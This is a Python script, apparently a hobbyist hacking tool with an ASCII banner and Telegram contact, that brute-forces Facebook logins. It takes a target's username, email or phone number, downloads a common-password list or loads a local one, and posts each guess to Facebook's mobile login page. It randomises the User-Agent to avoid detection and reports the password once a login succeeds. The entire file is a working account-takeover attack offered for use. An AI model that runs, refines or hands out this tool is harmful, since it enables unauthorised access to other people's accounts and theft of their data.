import pkg_resources
import requests
import random
import string
import time
import pyfiglet
import colorama
import os
from tkinter import Tk
from tkinter.filedialog import askopenfilename
from bs4 import BeautifulSoup
import re

# Initialize colorama
colorama.init()

# Define the information text with different colors and styles
info_text = [
    colorama.Fore.BLUE + "Author: " + colorama.Fore.GREEN + "TJ_Tech237",
    colorama.Fore.BLUE + "Telegram: " + colorama.Fore.GREEN + "TJ_Tech237",
    colorama.Fore.BLUE + "Version: " + colorama.Fore.GREEN + "1.0"
]

# Concatenate the information text
info = "\n".join(info_text)

# Create the banner text with the "slant" font
banner_text = pyfiglet.figlet_format("TJ_TECH", font="slant")

# Print the banner and the information
print(colorama.Fore.BLUE + banner_text)
print(info)

# Set the default encoding to UTF-8
os.environ["PYTHONIOENCODING"] = "UTF8"
os.environ["PYTHONLEGACYWINDOWSSTDIOENCODING"] = "UTF8"

url = 'https://mbasic.facebook.com'

user_input = input("Enter username, email, or phone number for the account to be brute-forced: ")

while True:
    option = input("Select an option:\n1. Use a random password list\n2. Input a password file manually\n3. Exit\n")

    if option == '1':
        password_list = requests.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt')
        passwords = password_list.text.split('\n')
        break

    elif option == '2':
        # Use file dialog to select the password file manually
        Tk().withdraw()  # Prevent tkinter root window from appearing
        file_path = askopenfilename()
        if file_path:
            with open(file_path) as f:
                passwords = f.read().split('\n')
            break
        else:
            print("No file selected.")

    elif option == '3':
        exit()

    else:
        print("Invalid option.")

# Initiate the session
with requests.Session() as session:
    found_password = None
    while not found_password and passwords:
        password = passwords.pop().strip()

        # Parameters to be sent with the POST request
        payload = {
            'email': user_input,
            'pass': password
        }

        # Generate random headers
        headers = {
            'User-Agent': ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        }

        # POST request to the login URL
        post = session.post(url, data=payload, headers=headers)

        # Wait for 2 seconds before sending the next request
        time.sleep(2)

        # Check if login was successful
        if 'Find Friends' in post.content.decode():
            found_password = password
        else:
            print('Testing Password:', password)

    if found_password:
        print('Login Successful')
        print("Password Found:", found_password)
    else:
        print('Password not found')

    print("Brute Force Complete")

# Additional code after the brute force process
# ...
